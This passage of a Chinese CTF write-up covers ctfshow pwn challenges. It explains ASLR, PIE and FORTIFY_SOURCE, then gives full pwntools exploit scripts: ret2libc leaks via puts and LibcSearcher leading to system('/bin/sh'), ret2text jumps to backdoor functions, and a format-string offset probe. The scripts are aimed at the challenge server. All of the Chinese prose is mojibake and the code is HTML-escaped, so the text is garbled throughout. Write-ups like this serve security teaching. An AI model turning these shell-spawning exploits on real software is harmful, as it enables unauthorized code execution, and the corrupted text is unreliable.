æ‰¾åˆ°libcä¸­çš„putså‡½æ•°åœ°å€ä¹‹åï¼Œå°†å†…å­˜çš„putså‡½æ•°åœ°å€å‡å»libcä¸­çš„putså‡½æ•°åœ°å€å°±å¾—åˆ°äº†libcçš„åŸºåœ°å€ libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) print(hex(libc_base)) # ä½¿ç”¨libc.dump(\u0026#34;system\u0026#34;)æ‰¾åˆ°libcä¸­çš„systemå‡½æ•°åœ°å€ï¼Œå†åŠ ä¸ŠåŸºåœ°å€å°±å¾—åˆ°systemå‡½æ•°åœ¨å†…å­˜çš„åœ°å€ system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # ä½¿ç”¨libc.dump(\u0026#34;str_bin_sh\u0026#34;)æ‰¾åˆ°libcä¸­çš„\u0026#34;/bin/sh\u0026#34;å­—ç¬¦ä¸²åœ°å€ï¼Œå†åŠ ä¸ŠåŸºåœ°å€å°±å¾—åˆ°\u0026#34;/bin/sh\u0026#34;å­—ç¬¦ä¸²åœ¨å†…å­˜çš„åœ°å€ binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # payloadï¼šå¡«å……æ ˆç©ºé—´åˆ°è¿”å›åœ°å€ï¼Œå°†è¿”å›åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€ # ç„¶åå¡«å……æ‰§è¡Œsystemå‡½æ•°ä¹‹åçš„è¿”å›åœ°å€ï¼Œå¡«å……ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œä½†æ˜¯é•¿åº¦å¿…é¡»ä¸º4 # æœ€åå¡«å…¥systemçš„å‚æ•°â€œ/bin/shâ€ payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) + b\u0026#39;a\u0026#39; * 4 + p32(binsh_addr) p.sendline(payload) p.recv() p.interactive() pwn26 SLRï¼ˆAddress Space Layout Randomizationï¼‰æ˜¯ä¸€ç§è®¡ç®—æœºå®‰å…¨æœºåˆ¶ï¼Œæ—¨åœ¨å¢åŠ æ¶æ„æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸ŠæˆåŠŸæ‰§è¡Œæ”»å‡»çš„éš¾åº¦ã€‚ASLRé€šè¿‡éšæœºåŒ–è¿›ç¨‹çš„åœ°å€ç©ºé—´å¸ƒå±€æ¥é˜²æ­¢æ”»å‡»è€…ä¾èµ–äºå·²çŸ¥çš„å†…å­˜åœ°å€ï¼Œä»è€Œå¢åŠ äº†æ”»å‡»çš„å¤æ‚æ€§ã€‚ASLRå¯ä»¥éšæœºåŒ–ä»¥ä¸‹ç»„ä»¶çš„ä½ç½®ï¼š\næ ˆï¼šåŒ…å«å‡½æ•°è°ƒç”¨å’Œå±€éƒ¨å˜é‡çš„åŒºåŸŸã€‚ å †ï¼šç”¨äºåŠ¨æ€åˆ†é…å†…å­˜çš„åŒºåŸŸã€‚ å…±äº«åº“ï¼šåŠ¨æ€é“¾æ¥çš„å…±äº«åº“çš„åŠ è½½åœ°å€ã€‚ ä»£ç æ®µï¼šåŒ…å«ç¨‹åºæŒ‡ä»¤çš„åŒºåŸŸã€‚ åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ/proc/sys/kernel/randomize_va_space æ˜¯ä¸€ä¸ªæ§åˆ¶å’ŒæŸ¥çœ‹ASLRçš„æ¥å£æ–‡ä»¶ã€‚\n/proc/sys/kernel/randomize_va_space å¯ä»¥å…·æœ‰ä»¥ä¸‹å€¼ï¼š\n0ï¼šè¡¨ç¤º ASLR è¢«ç¦ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿›ç¨‹çš„åœ°å€ç©ºé—´å°†ä¸ä¼šéšæœºåŒ–ï¼Œå„ä¸ªç»„ä»¶çš„åœ°å€ä½ç½®å°†æ˜¯å›ºå®šçš„ã€‚\n1ï¼šè¡¨ç¤º ASLR å·²å¯ç”¨ï¼Œä½†åªä¼šå¯¹å…±äº«åº“çš„åœ°å€è¿›è¡ŒéšæœºåŒ–ã€‚å³åœ¨æ¯æ¬¡è¿è¡Œæ—¶ï¼Œå…±äº«åº“çš„åŠ è½½åœ°å€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè€Œè¿›ç¨‹çš„æ ˆã€å †å’Œä»£ç æ®µçš„åœ°å€ä½ç½®ä»ç„¶æ˜¯å›ºå®šçš„ã€‚\n2ï¼šè¡¨ç¤º ASLR å·²å¯ç”¨ï¼Œå¯¹è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­çš„æ‰€æœ‰ç»„ä»¶ï¼ˆåŒ…æ‹¬æ ˆã€å †ã€å…±äº«åº“å’Œä»£ç æ®µï¼‰è¿›è¡Œå®Œå…¨éšæœºåŒ–ã€‚è¿™æ˜¯æœ€å®‰å…¨çš„è®¾ç½®ï¼Œå› ä¸ºæ¯æ¬¡è¿è¡Œæ—¶ï¼Œè¿›ç¨‹çš„æ‰€æœ‰ç»„ä»¶çš„åœ°å€ä½ç½®éƒ½ä¼šå‘ç”Ÿå˜åŒ–ã€‚\npwn29 PIEå…¨ç§°æ˜¯position-independent executableï¼Œä¸­æ–‡è§£é‡Šä¸ºåœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¯¥æŠ€æœ¯æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»£ç æ®µï¼ˆ.textï¼‰ã€æ•°æ®æ®µï¼ˆ.dataï¼‰ã€æœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼ˆ.bssï¼‰ç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ï¼Œå¦‚æœç¨‹åºå¼€å¯äº†PIEä¿æŠ¤çš„è¯ï¼Œåœ¨æ¯æ¬¡åŠ è½½ç¨‹åºæ—¶éƒ½å˜æ¢åŠ è½½åœ°å€ï¼Œä»è€Œä¸èƒ½é€šè¿‡ROPgadgetç­‰ä¸€äº›å·¥å…·æ¥å¸®åŠ©è§£é¢˜ã€‚åœ¨PIEå’ŒASLRåŒæ—¶å¼€å¯çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€æ— æ‰€çŸ¥ï¼Œå¤§å¤§å¢åŠ äº†åˆ©ç”¨éš¾åº¦ã€‚ç„¶è€Œåœ¨å¢åŠ å®‰å…¨æ€§çš„åŒæ—¶ï¼ŒPIEä¹Ÿä¼šä¸€å®šç¨‹åº¦ä¸Šå½±å“æ€§èƒ½ï¼Œå› æ­¤åœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿä¸ŠPIEä»…ç”¨äºä¸€äº›å¯¹å®‰å…¨æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„ç¨‹åºã€‚ å¯ä»¥çœ‹åˆ°executable:åé¢è¾“å‡ºçš„æ˜¯mainå‡½æ•°çš„åœ°å€ï¼Œç”±äºPIEä¿æŠ¤ï¼Œå·²ç»å‘ç”Ÿäº†å˜åŒ–\npwn30 æº¢å‡ºæ¼æ´ï¼Œç”¨ret2libc,ç”¨äºç»•è¿‡æ ˆæº¢å‡ºæ¼æ´ç­‰ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„é˜²å¾¡æªæ–½ï¼ˆæ¯”å¦‚NXé˜²å¾¡æœºåˆ¶ï¼‰ï¼Œä»¥å®ç°ä»£ç æ‰§è¡Œæˆ–æå‡æ”»å‡»è€…æƒé™ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from pwn import * from LibcSearcher import * # æ‰“å°è°ƒè¯•ä¿¡æ¯ context.log_level = \u0026#39;debug\u0026#39; # å»ºç«‹è¿æ¥ p = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28309\u0026#34;) elf = ELF(\u0026#34;./pwn\u0026#34;) # æº¢å‡ºåç§»åœ°å€ offset = 0x88 + 0x4 # mainå‡½æ•°åœ°å€ main_addr = elf.symbols[\u0026#39;main\u0026#39;] # pltè¡¨ä¸­putså‡½æ•°åœ°å€ puts_plt = elf.plt[\u0026#39;puts\u0026#39;] # gotè¡¨ä¸­putså‡½æ•°çš„åœ°å€ puts_got = elf.got[\u0026#39;puts\u0026#39;] # payloadï¼š0x88+0x4ä¸ªæ— ç”¨å¡«å……å­—ç¬¦è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œ # å°†putså‡½æ•°pltè¡¨åœ°å€åšè¿”å›åœ°å€ï¼Œä»£è¡¨ctfshowå‡½æ•°æ‰§è¡Œå®Œä¼šæ‰§è¡Œputså‡½æ•°ï¼Œ # main_addræ˜¯putså‡½æ•°æ‰§è¡Œå®Œåçš„è¿”å›åœ°å€ï¼Œä½¿ç”¨putså‡½æ•°æ‰§è¡Œå®Œåå›åˆ°mainå‡½æ•°ç»§ç»­åˆ©ç”¨æº¢å‡ºæ¼æ´ # putså‡½æ•°gotè¡¨ä¸­çš„åœ°å€ä½œä¸ºputså‡½æ•°æ‰§è¡Œçš„å‚æ•°ï¼Œè®©putså‡½æ•°è¾“å‡ºputså‡½æ•°åœ¨å†…å­˜çš„åœ°å€ payload = offset * b\u0026#39;a\u0026#39; + p32(puts_plt) + p32(main_addr) + p32(puts_got) # å‘é€payload p.sendline(payload) # æ¥æ”¶putså‡½æ•°è¾“å‡ºçš„putså‡½æ•°åœ¨å†…å­˜çš„åœ°å€ puts_addr = u32(p.recv()[0:4]) print(hex(puts_addr)) # æ ¹æ®å†…å­˜ä¸­putså‡½æ•°çš„åœ°å€å¯»æ‰¾ç›¸åº”çš„libcç‰ˆæœ¬ä¸­putså‡½æ•°çš„åœ°å€ libc = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # æ‰¾åˆ°libcä¸­çš„putså‡½æ•°åœ°å€ä¹‹åï¼Œå°†å†…å­˜çš„putså‡½æ•°åœ°å€å‡å»libcä¸­çš„putså‡½æ•°åœ°å€å°±å¾—åˆ°äº†libcçš„åŸºåœ°å€ libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) print(hex(libc_base)) # ä½¿ç”¨libc.dump(\u0026#34;system\u0026#34;)æ‰¾åˆ°libcä¸­çš„systemå‡½æ•°åœ°å€ï¼Œå†åŠ ä¸ŠåŸºåœ°å€å°±å¾—åˆ°systemå‡½æ•°åœ¨å†…å­˜çš„åœ°å€ system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # ä½¿ç”¨libc.dump(\u0026#34;str_bin_sh\u0026#34;)æ‰¾åˆ°libcä¸­çš„\u0026#34;/bin/sh\u0026#34;å­—ç¬¦ä¸²åœ°å€ï¼Œå†åŠ ä¸ŠåŸºåœ°å€å°±å¾—åˆ°\u0026#34;/bin/sh\u0026#34;å­—ç¬¦ä¸²åœ¨å†…å­˜çš„åœ°å€ binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # payloadï¼šå¡«å……æ ˆç©ºé—´åˆ°è¿”å›åœ°å€ï¼Œå°†è¿”å›åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€ # ç„¶åå¡«å……æ‰§è¡Œsystemå‡½æ•°ä¹‹åçš„è¿”å›åœ°å€ï¼Œå¡«å……ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œä½†æ˜¯é•¿åº¦å¿…é¡»ä¸º4 # æœ€åå¡«å…¥systemçš„å‚æ•°â€œ/bin/shâ€ payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) + b\u0026#39;a\u0026#39; * 4 + p32(binsh_addr) p.sendline(payload) p.interactive() å“ï¼Œæœ‰äº›éš¾ç†è§£\npwn32 FortifyåŠŸèƒ½\nåœ¨ä½¿ç”¨FORTIFY_SOURCEåŠŸèƒ½çš„ç¼–è¯‘å™¨ç¯å¢ƒä¸­ï¼Œå½“æ£€æµ‹åˆ°æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºæˆ–å…¶ä»–å†…å­˜é”™è¯¯æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ›¿æ¢å¯¹åº”çš„ä¸å®‰å…¨Cåº“å‡½æ•°ï¼ˆä¾‹å¦‚strcpyï¼Œmemcpyç­‰ï¼‰è°ƒç”¨ä¸ºæ›´å®‰å…¨çš„ç‰ˆæœ¬ã€‚è¿™äº›å®‰å…¨ç‰ˆæœ¬çš„å‡½æ•°åœ¨æ‰§è¡Œå‰ä¼šè¿›è¡Œä¸€äº›è¾¹ç•Œæ£€æŸ¥ï¼Œä»¥ç¡®ä¿ä¸ä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºã€‚\næ­¤å¤–ï¼ŒFORTIFY_SOURCEè¿˜ä¼šå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼ˆå¦‚printfã€scanfç­‰ï¼‰çš„å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œä»¥ç¡®ä¿å…¶æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°ä¸å®é™…å‚æ•°çš„ç±»å‹åŒ¹é…ï¼Œä»è€Œé¿å…æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚\næœ¬è´¨ä¸Šä¸€ç§æ£€æŸ¥å’Œæ›¿æ¢æœºåˆ¶ï¼Œå¯¹GCCå’Œglibcçš„ä¸€ä¸ªå®‰å…¨è¡¥ä¸ï¼Œç›®å‰æ”¯æŒmemcpy, memmove, memset, strcpy, strncpy, strcat, strncat,sprintf, vsprintf, snprintf, vsnprintf, getsç­‰ã€‚\nÂ·FORTIFY_SOURCE=0: è¿™æ˜¯Fortify SourceåŠŸèƒ½çš„é»˜è®¤çº§åˆ«ï¼Œä¹Ÿå°±æ˜¯ç¦ç”¨çŠ¶æ€ã€‚\nÂ·FORTIFY_SOURCE=1: è¿™æ˜¯ç¬¬ä¸€ä¸ªå¯ç”¨çº§åˆ«ã€‚å¦‚æœç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶æ£€æµ‹åˆ°æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºæˆ–å…¶ä»–å†…å­˜é”™è¯¯ï¼Œå®ƒå°†ç”Ÿæˆä¸€ä¸ªè¿è¡Œæ—¶æ£€æŸ¥çš„è­¦å‘Šï¼Œä½†ç¨‹åºä»ç„¶ä¼šç»§ç»­æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œä¼šå°†strcpyæ›¿æ¢ä¸º__strcpy_chkï¼Œmemcpyæ›¿æ¢ä¸º__memcpy_chkç­‰ã€‚\nÂ·FORTIFY_SOURCE=2: è¿™æ˜¯æœ€é«˜çº§åˆ«çš„å¯ç”¨ã€‚å¦‚æœç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶æ£€æµ‹åˆ°æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºæˆ–å†…å­˜é”™è¯¯ï¼Œå®ƒå°†ç”Ÿæˆä¸€ä¸ªè¿è¡Œæ—¶æ£€æŸ¥çš„é”™è¯¯ï¼Œå¹¶ä¸”ç¨‹åºçš„æ‰§è¡Œå°†è¢«ç»ˆæ­¢\nfgets(char *str, int n, FILE *stream) ä»æŒ‡å®šçš„æµ stream è¯»å–ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²å†…ï¼Œnæ˜¯è¦è¯»å–çš„æœ€å¤§å­—ç¬¦ä¸²é•¿åº¦\ngetgid()ç”¨æ¥å–å¾—æ‰§è¡Œç›®å‰è¿›ç¨‹çš„ç»„è¯†åˆ«ç \nstrtol() å‡½æ•°å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºé•¿æ•´æ•°å€¼\n*(_QWORD *)ä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œé€šå¸¸ç”¨äºå°†ä¸€ä¸ªåœ°å€ï¼ˆæˆ–å…¶ä»–æ•´æ•°ï¼‰è½¬æ¢ä¸ºä¸€ä¸ªæŒ‡å‘64ä½æ— ç¬¦å·æ•´æ•°çš„æŒ‡é’ˆï¼Œå¹¶è·å–è¯¥åœ°å€ä¸Šçš„å€¼ã€‚\nmemcpy(void *str1, const void *str2, size_t n) ä»å­˜å‚¨åŒº str2 å¤åˆ¶ n ä¸ªå­—èŠ‚åˆ°å­˜å‚¨åŒº str1\nå¯¹å‡½æ•°çš„è§£é‡Š mainå‡½æ•°ä¸‰ä¸ªå‚æ•°ï¼Œargcæ˜¯å‘½ä»¤è¡Œå‚æ•°çš„æ•°é‡ï¼Œargvæ˜¯å‘½ä»¤è¡Œå­—ç¬¦ä¸²æ•°ç»„ï¼Œenvpæ˜¯ç¯å¢ƒå˜é‡æ•°ç»„\nsetresgid(v3, v3, v3)ï¼šå°†å½“å‰è¿›ç¨‹çš„çœŸå® GIDã€æœ‰æ•ˆ GID å’Œä¿å­˜çš„ GID éƒ½è®¾ç½®ä¸ºv3çš„å€¼\nv4 = argv[1]ï¼šå°†ç¬¬ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°èµ‹å€¼ç»™ v4ã€‚ \\*(_QWORD \\*)buf1 = \\*(_QWORD \\*)v4ï¼šå°† v4 çš„å‰ 8 ä¸ªå­—èŠ‚å¤åˆ¶åˆ° buf1 ä¸­ã€‚ï¼ˆQWORDå…«ä¸ªå­—èŠ‚ï¼‰ \\*(_WORD \\*)\u0026amp;buf1[8] = \\*((_WORD \\*)v4 + 4)ï¼šå°† v4 çš„ç¬¬ 9 å’Œç¬¬ 10 ä¸ªå­—èŠ‚å¤åˆ¶åˆ° buf1 çš„ç¬¬ 9 å’Œç¬¬ 10 ä¸ªä½ç½®ã€‚ï¼ˆWORDä¸¤ä¸ªå­—èŠ‚ï¼‰ buf1[10] = v4[10]ï¼šå°† v4 çš„ç¬¬ 11 ä¸ªå­—èŠ‚å¤åˆ¶åˆ° buf1 çš„ç¬¬ 11 ä¸ªä½ç½®ã€‚ ä½œç”¨ï¼šå°† argv[1] çš„å†…å®¹å¤åˆ¶åˆ° buf1 ä¸­ã€‚ å¤„ç†å‘½ä»¤è¡Œå‚æ•°ï¼Œå°†å…¶å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­ã€‚ æ‰“å°ç¼“å†²åŒºå†…å®¹ã€‚ ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®å¹¶æ‰“å°ã€‚ æ£€æŸ¥å‘½ä»¤è¡Œå‚æ•°æ•°é‡ï¼Œå¦‚æœè¶…è¿‡ 4 ä¸ªï¼Œè°ƒç”¨æœªå®šä¹‰å‡½æ•°ã€‚ pwn33 ç°åœ¨FORTIFY_SOURCE=1ï¼Œå³Fortify åŠŸèƒ½å·²å¯ç”¨ã€‚é™„ä»¶æ˜¯64ä½elfï¼Œç”¨IDAæ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢˜ä¸­çš„strcpyè¢«æ›¿æ¢ä¸º__strcpy_chkï¼Œmemcpyè¢«æ›¿æ¢ä¸º__memcpy_chkï¼Œä¹ŸåŠ ä¸Šäº†11LLçš„é™åˆ¶é˜²æ­¢æº¢å‡ºï¼Œè¿™æ˜¯ç¬¬ä¸€çº§Fortifyçš„ç‰¹å¾\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 `__memcpy_chk(buf1, argv[2], v5, 11LL)` ä¸­ï¼š - **`buf1`**ï¼šç›®æ ‡ç¼“å†²åŒºï¼Œæ•°æ®å°†è¢«å¤åˆ¶åˆ°è¿™é‡Œã€‚ - **`argv[2]`**ï¼šæºç¼“å†²åŒºï¼Œæ•°æ®ä»è¿™é‡Œå¤åˆ¶ï¼ˆé€šå¸¸æ˜¯å‘½ä»¤è¡Œå‚æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰ã€‚ - **`v5`**ï¼šè¦å¤åˆ¶çš„å­—èŠ‚æ•°ã€‚ - **`11LL`**ï¼šç›®æ ‡ç¼“å†²åŒº `buf1` çš„å®é™…å¤§å°ï¼ˆ11 å­—èŠ‚ï¼‰ã€‚ __memcpy_chk çš„åŠŸèƒ½æ˜¯å°† argv[2] ä¸­çš„ v5 ä¸ªå­—èŠ‚å¤åˆ¶åˆ° buf1 ä¸­ï¼Œä½†åœ¨å¤åˆ¶ä¹‹å‰ä¼šæ£€æŸ¥ç›®æ ‡ç¼“å†²åŒº buf1 çš„å¤§å°æ˜¯å¦è¶³å¤Ÿï¼š å¦‚æœ v5 è¶…è¿‡äº† buf1 çš„å¤§å°ï¼ˆ11 å­—èŠ‚ï¼‰ï¼Œ__memcpy_chk ä¼šè§¦å‘ç¼“å†²åŒºæº¢å‡ºä¿æŠ¤æœºåˆ¶ï¼Œç»ˆæ­¢ç¨‹åºå¹¶è¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚ å¦‚æœ v5 å°äºæˆ–ç­‰äº buf1 çš„å¤§å°ï¼Œåˆ™æ­£å¸¸æ‰§è¡Œå¤åˆ¶æ“ä½œã€‚ __strcpy_chk çš„åŠŸèƒ½æ˜¯å°† argv[1] ä¸­çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° buf2 ä¸­ï¼Œä½†åœ¨å¤åˆ¶ä¹‹å‰ä¼šæ£€æŸ¥ç›®æ ‡ç¼“å†²åŒº buf2 çš„å¤§å°æ˜¯å¦è¶³å¤Ÿï¼š å¦‚æœ argv[1] çš„é•¿åº¦ï¼ˆåŒ…æ‹¬å­—ç¬¦ä¸²ç»“æŸç¬¦ \\0ï¼‰è¶…è¿‡äº† buf2 çš„å¤§å°ï¼ˆ11 å­—èŠ‚ï¼‰ï¼Œ__strcpy_chk ä¼šè§¦å‘ç¼“å†²åŒºæº¢å‡ºä¿æŠ¤æœºåˆ¶ï¼Œç»ˆæ­¢ç¨‹åºå¹¶è¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚ å¦‚æœ argv[1] çš„é•¿åº¦å°äºæˆ–ç­‰äº buf2 çš„å¤§å°ï¼Œåˆ™æ­£å¸¸æ‰§è¡Œå¤åˆ¶æ“ä½œã€‚ å‰è€…æ˜¯å¸¦ç¼“å†²åŒºçš„å†…å­˜å¤åˆ¶å‡½æ•°ï¼Œåè€…æ˜¯å¸¦ç¼“å†²åŒºçš„å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•°\npwn34 æ­¤æ—¶FORTIFY_SOURCE=2ï¼Œå¯ç”¨äº†ç¬¬äºŒçº§Fortifyï¼Œç”¨IDAæ‰“å¼€é™„ä»¶æŸ¥çœ‹ï¼Œæ­¤æ—¶printfå‡½æ•°ä¹Ÿè¢«æ›¿æ¢æˆäº†__printf_chkï¼ŒUndefinedå‡½æ•°å‰çš„ifæ¡ä»¶ä¹Ÿæ²¡äº†\npwn35 sprintfå°±æ˜¯æŠŠæ ¼å¼åŒ–çš„æ•°æ®å†™å…¥åˆ°æŸä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¿”å›å€¼å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚\nfprintf()å‡½æ•°æ ¹æ®æŒ‡å®šçš„format(æ ¼å¼)å‘é€ä¿¡æ¯(å‚æ•°)åˆ°ç”±stream(æµ)æŒ‡å®šçš„æ–‡ä»¶.å› æ­¤fprintf()å¯ä»¥ä½¿å¾—ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ã€‚\nstdout, stdin, stderrçš„ä¸­æ–‡åå­—åˆ†åˆ«æ˜¯æ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†é”™è¯¯ã€‚\nstdoutæ˜¯è¡Œç¼“å†²çš„ï¼Œä»–çš„è¾“å‡ºä¼šæ”¾åœ¨ä¸€ä¸ªbufferé‡Œé¢ï¼Œåªæœ‰åˆ°æ¢è¡Œçš„æ—¶å€™ï¼Œæ‰ä¼šè¾“å‡ºåˆ°å±å¹•ã€‚è€Œstderræ˜¯æ— ç¼“å†²çš„ï¼Œä¼šç›´æ¥è¾“å‡ºï¼Œ\nfflush()åˆ·æ–°ç¼“å†²åŒº\næ³¨æ„åˆ°signal(11, (__sighandler_t)sigsegv_handler);Signal 11é”™è¯¯ï¼Œä¹Ÿç§°ä¸ºâ€œSegmentation faultâ€ï¼Œæ˜¯ä¸€ç§ç”¨äºæç¤ºUnixç³»ç»Ÿç¨‹åºå‡ºç°é”™è¯¯çš„ä¿¡å·ã€‚å½“åº”ç”¨ç¨‹åºè¯•å›¾å¯¹æ— æƒè®¿é—®çš„å†…å­˜åœ°å€è¿›è¡Œè¯»å†™æ“ä½œæ—¶,ä¼šè°ƒç”¨ sigsegv_handler å‡½æ•°,sigsegv_handler å‡½æ•° ä¼šæŠŠstderræ‰“å°è¾“å‡º,å³å°†flagçš„å€¼æ‰“å°è¾“å‡ºé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¾“å…¥è¶…é•¿æ•°æ®å°±ä¼šæº¢å‡ºï¼Œç¨‹åºå°±ä¼šå´©æºƒè¿›è€Œæ‰“å°å‡ºflag strcpyå‡½æ•°ï¼ˆstrcpyå‡½æ•°æ²¡æœ‰é•¿åº¦é™åˆ¶ï¼‰è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªå…¸å‹çš„å¯ä»¥ç”¨æ¥åˆ©ç”¨æº¢å‡ºçš„å‡½æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œæ ˆæº¢å‡ºã€‚\npwn36 ä»…å¼€äº†RELRO\nå±é™©å‡½æ•°gets()å‡½æ•°\né¢˜ç›®è¯´äº†ï¼Œåˆ©ç”¨åé—¨å‡½æ•°ï¼Œæ‰¾åˆ°get_flagå‡½æ•°çš„ä½ç½®ï¼Œå’Œåç§»é‡0x28ï¼Œebpåœ¨sä¸Šé¢0x28å¤„\næ ˆç»“æ„\n1 2 3 4 5 6 7 8 9 10 11 12 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ è¦†ç›–å\n1 2 3 4 5 6 7 8 9 10 11 12 +-----------------+ | 0x0804843B | +-----------------+ | bbbb | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * r =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28197) offset =0x28 flag_address = 0x08048586 payload = offset * b\u0026#39;a\u0026#39;+ b\u0026#39;bbbb\u0026#39;+ p32(flag_address) r.sendline(payload) r.interactive() pwn37 system(\u0026quot;/bin/sh\u0026quot;)è°ƒç”¨é»˜è®¤shellæ¥ä¼ å…¥å‘½ä»¤å­—ç¬¦ä¸²ï¼Œå’Œä¸Šé¢ä¸€æ ·\npwn38 64ä½ï¼Œæ³¨æ„å †æ ˆå¹³è¡¡ï¼\nå¯ä»¥ç›´æ¥ç”¨gdbçœ‹æ±‡ç¼–ä»£ç \ngdb pwn\ndisass backdoor\ncyclic 200\nå¡«å……å­—ç¬¦ä¸²\ncyclic -l åœ°å€\nçœ‹åç§»ï¼Œåç§»é‡æœ€åè¦åŠ 8ï¼ˆå †æ ˆå¹³è¡¡ï¼‰\nIDAä¸­æ‰¾retåœ°å€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28220\u0026#34;) offset = 0xa + 0x8 ret_addr = 0x0000000000400287 backdoor_addr = 0x0000000000400657 payload = offset * b\u0026#39;a\u0026#39; + p64(ret_addr) + p64(backdoor_addr) io.sendline(payload) io.interactive() pwn39 æ²¡æœ‰åé—¨å‡½æ•°ï¼Œä½†æ˜¯æœ‰hint\nå¾—åˆ°åç§»é‡\næ‹¿åˆ°/bin/shçš„åœ°å€\næ‹¿åˆ°systemçš„åœ°å€\n1 objdump -d -j .plt pwn æŸ¥çœ‹IDAä¹Ÿå¯\n1 2 3 4 5 6 7 8 9 10 from pwn import * io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28241\u0026#34;) offset = 22 binsh_addr = 0x08048750 system_addr = 0x080483a0 payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) +b\u0026#39;bbbb\u0026#39;+ p32(binsh_addr) io.sendline(payload) io.interactive() è¡¥å……ä¸€ä¸‹ï¼šä»£è¡¨æ˜¯systemå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç”±äºä¸éœ€è¦è¿”å›åˆ°æŸä¸ªåœ°æ–¹ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨bbbbä»£æ›¿å››ä¸ªå­—èŠ‚\npwn94 æ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®\n1 2 aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x aaaa-ff9474a8-64-80486e5-1-0-61616161-2d78252d-252d7825-78252d78-2d78252d-252d7825 aaaaï¼šè¿™æ˜¯ä¸€ä¸ªå›ºå®šçš„å­—ç¬¦ä¸²ï¼Œç”¨äºåœ¨æ ˆä¸Šæ ‡è®°ä¸€ä¸ªå·²çŸ¥å€¼ï¼ˆ0x61616161ï¼Œå³aaaaçš„ASCIIç ï¼‰ã€‚ -%xï¼š%xæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„å 